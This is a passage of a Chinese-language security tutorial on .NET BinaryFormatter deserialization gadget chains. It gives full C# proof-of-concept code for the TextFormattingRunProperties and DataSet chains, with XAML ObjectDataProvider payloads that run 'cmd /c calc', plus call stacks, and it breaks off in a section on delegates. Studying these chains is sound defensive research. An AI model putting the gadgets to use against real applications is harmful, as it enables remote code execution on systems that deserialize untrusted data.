我们只需要给他的<code>ForegroundBrush</code>或者是<code>BackgroundBrush</code>属性赋值为我们Xaml的payload即可完成命令执行</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BinaryFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这个protected的构造函数必须得写  不然会报错  因为在反序列化的时候要调用他</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//在这里设置的TextFormattingRunProperties这个类  因为在序列化的时候优先调用我们自身类的GetObjectData</span></span><br><span class="line">            <span class="comment">//然后再调用TextFormattingRunProperties里面的Get方法</span></span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xaml的payload就是Dotnet-Deserialization-02给出的payload</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;ResourceDictionary</span><br><span class="line">    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span></span><br><span class="line">    xmlns:sd=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=System&quot;</span></span><br><span class="line">    xmlns:x=<span class="string">&quot;http://schemas.microsoft</span></span><br><span class="line"><span class="string">.com/winfx/2006/xaml&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider MethodName=<span class="string">&quot;Start&quot;</span> x:Key=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.ObjectInstance&gt;</span><br><span class="line">            &lt;sd:Process&gt;</span><br><span class="line">                &lt;sd:Process.StartInfo&gt;</span><br><span class="line">                    &lt;sd:ProcessStartInfo Arguments=<span class="string">&quot;test&quot;</span> S</span><br><span class="line">tandardErrorEncoding=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> StandardOutputEncoding=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> UserName=<span class="string">&quot;&quot;</span> Password=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> Domain=<span class="string">&quot;&quot;</span> LoadUserProfile=<span class="string">&quot;False&quot;</span> FileName=<span class="string">&quot;calc&quot;</span> /&gt;</span><br><span class="line">                &lt;/sd:Process.StartInfo&gt;</span><br><span class="line">            &lt;/sd:Process&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.ObjectInstance&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240225181630669.png" alt="image-20240225181630669"></p><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>流程  </p><p>就是我们自己写了个继承于ISerializable接口的类   然后重写了GetObjectData方法   里面对TextFormattingRunProperties类的ForegroundBrush参数进行赋值   </p><h2 id="DataSet-Binary二次反序列化"><a href="#DataSet-Binary二次反序列化" class="headerlink" title="DataSet(Binary二次反序列化)"></a>DataSet(Binary二次反序列化)</h2><p><img src="../images/image-20240225182800448.png" alt="image-20240225182800448"></p><p>这个类其实也是实现了ISerializable 接口  也是可以实现像上述TextFormattingRunProperties类的操作  先去看起构造方法</p><p><img src="../images/image-20240225183109294.png" alt="image-20240225183109294"></p><p>其构造方法会进入到DeserializeDataSet这个反序列化函数中  跟进</p><p><img src="../images/image-20240225183158408.png" alt="image-20240225183158408"></p><p>再跟进DeserializeDataSetSchema函数中去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private void DeserializeDataSetSchema(</span><br><span class="line">      SerializationInfo info,</span><br><span class="line">      StreamingContext context,</span><br><span class="line">      SerializationFormat remotingFormat,</span><br><span class="line">      SchemaSerializationMode schemaSerializationMode)</span><br><span class="line">    &#123;</span><br><span class="line">      if (remotingFormat != SerializationFormat.Xml)</span><br><span class="line">      &#123;</span><br><span class="line">        if (schemaSerializationMode == SchemaSerializationMode.IncludeSchema)</span><br><span class="line">        &#123;</span><br><span class="line">          this.DeserializeDataSetProperties(info, context);</span><br><span class="line">          int int32 = info.GetInt32(&quot;DataSet.Tables.Count&quot;);</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">          &#123;</span><br><span class="line">            MemoryStream serializationStream = new MemoryStream((byte[]) info.GetValue(string.Format((IFormatProvider) CultureInfo.InvariantCulture, &quot;DataSet.Tables_&#123;0&#125;&quot;, new object[1]</span><br><span class="line">            &#123;</span><br><span class="line">              (object) index</span><br><span class="line">            &#125;), typeof (byte[])));</span><br><span class="line">            serializationStream.Position = 0L;</span><br><span class="line">            this.Tables.Add((DataTable) new BinaryFormatter((ISurrogateSelector) null, new StreamingContext(context.State, (object) false)).Deserialize((Stream) serializationStream));</span><br><span class="line">          &#125;</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">            this.Tables[index].DeserializeConstraints(info, context, index, true);</span><br><span class="line">          this.DeserializeRelations(info, context);</span><br><span class="line">          for (int index = 0; index &lt; int32; ++index)</span><br><span class="line">            this.Tables[index].DeserializeExpressionColumns(info, context, index);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">          this.DeserializeDataSetProperties(info, context);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        string s = (string) info.GetValue(&quot;XmlSchema&quot;, typeof (string));</span><br><span class="line">        if (s == null)</span><br><span class="line">          return;</span><br><span class="line">        this.ReadXmlSchema((XmlReader) new XmlTextReader((TextReader) new StringReader(s)), true);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.Tables.Add((DataTable) new BinaryFormatter((ISurrogateSelector) null, new StreamingContext(context.State, (object) false)).Deserialize((Stream) serializationStream));</span><br></pre></td></tr></table></figure><p>主要是这行代码进行了Binary二进制反序列化</p><p><img src="../images/image-20240225183528131.png" alt="image-20240225183528131"></p><p>然后我们就只关注这个serializationStream参数是在哪传入的就行了   我们将第一次的序列化流给其赋值就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MemoryStream serializationStream = new MemoryStream((byte[]) info.GetValue(string.Format((IFormatProvider) CultureInfo.InvariantCulture, &quot;DataSet.Tables_&#123;0&#125;&quot;, new object[1]</span><br></pre></td></tr></table></figure><p>它来自<code>DataSet.Tables_0</code>的值，那我们在序列化的时候给他赋值为TextFormattingRunProperties的二进制bytes流即可，但是我们也需要给其他属性赋值，否则无法正常反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">info.SetType(typeof(System.Data.DataSet));</span><br><span class="line">            info.AddValue(&quot;DataSet.RemotingFormat&quot;, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(&quot;DataSet.DataSetName&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.Namespace&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.Prefix&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.CaseSensitive&quot;, false);</span><br><span class="line">            info.AddValue(&quot;DataSet.LocaleLCID&quot;, 0x409);</span><br><span class="line">            info.AddValue(&quot;DataSet.EnforceConstraints&quot;, false);</span><br><span class="line">            info.AddValue(&quot;DataSet.ExtendedProperties&quot;, (System.Data.PropertyCollection)null);</span><br><span class="line">            info.AddValue(&quot;DataSet.Tables.Count&quot;, 1);</span><br><span class="line">            info.AddValue(&quot;DataSet.Tables_0&quot;, _fakeTable);</span><br></pre></td></tr></table></figure><p>这些值是再yoserial中查看到的   就是得给这些值赋值才行    不然会反序列化失败</p><p><img src="../images/image-20240225183842031.png" alt="image-20240225183842031"></p><p>poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingPropersGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingPropersGadgets</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">GetTextFormattingPropersBytes</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                <span class="keyword">return</span> memoryStream.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DataSetMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] _fakeTable;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Data.DataSet));</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.RemotingFormat&quot;</span>, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.DataSetName&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Namespace&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Prefix&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.CaseSensitive&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.LocaleLCID&quot;</span>, <span class="number">0x409</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.EnforceConstraints&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.ExtendedProperties&quot;</span>, (System.Data.PropertyCollection)<span class="literal">null</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables.Count&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables_0&quot;</span>, _fakeTable);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetFakeTable</span>(<span class="params"><span class="built_in">byte</span>[] bfPayload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _fakeTable = bfPayload;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DatasetGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> textFormattingPropersBytes = TextFormattingPropersGadgets.GetTextFormattingPropersBytes();</span><br><span class="line">            <span class="keyword">var</span> dataSetMarshal = <span class="keyword">new</span> DataSetMarshal();</span><br><span class="line">            dataSetMarshal.SetFakeTable(textFormattingPropersBytes);</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, dataSetMarshal);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">new TextFormattingRunProperties() </span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [2]</span><br><span class="line">ObjectManager.FixupSpecialObject() [2]</span><br><span class="line">ObjectManager.DoFixups() [2]</span><br><span class="line">ObjectReader.Deserialize() [2]</span><br><span class="line">BinaryFormatter.Deserialize() [2]</span><br><span class="line">DataSet.DeserializeDataSetSchema() </span><br><span class="line">new DataSet()</span><br><span class="line">new DataSet()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [1]</span><br><span class="line">ObjectManager.FixupSpecialObject() [1]</span><br><span class="line">ObjectManager.DoFixups() [1]</span><br><span class="line">ObjectReader.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">DatasetGadgets.Main()</span><br></pre></td></tr></table></figure><h2 id="TypeConfuseDelegate"><a href="#TypeConfuseDelegate" class="headerlink" title="TypeConfuseDelegate"></a>TypeConfuseDelegate</h2><p>TypeConfuseDelegate中文翻译过来叫类型混淆委托。那么学习这条链之前必须要了解什么是委托。 其并不是一个类</p><h3 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h3><p>其实是跟java的动态代理是差不多意思的</p><p>给个委派的demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintString</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate myDelegate = <span class="keyword">new</span> MyDelegate(PrintString);</span><br><span class="line">        myDelegate(<span class="string">&quot;hello from delegate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226094829689.png" alt="image-20240226094829689"></p><p><strong>需要注意的是传递给委托的方法签名必须和定义的委托签名一致，即返回值、参数一致(参数类型和数量一致)。</strong></p><p>通过new MyDelegate(PrintString)将PrintString的引用赋值给myDelegate，然后使用myDelegate(“hello from delegate”)传递参数。myDelegate持有对PrintString的引用。</p><h3 id="多播委托"><a href="#多播委托" class="headerlink" title="多播委托"></a>多播委托</h3><p>多播委托则是持有对委托列表的引用，<strong>把多播委托想象成一个列表</strong>，将委托的方法加入列表中，多播委托会按顺序依次调用每个委托。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line">namespace DonNET_Deserialization;</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">    public delegate void MyDelegate(string s);</span><br><span class="line"></span><br><span class="line">    public static void PrintString(string s)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine($&quot;print &#123;s&#125; to screen.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void WriteToFile(string s)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine($&quot;write &#123;s&#125; to file.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        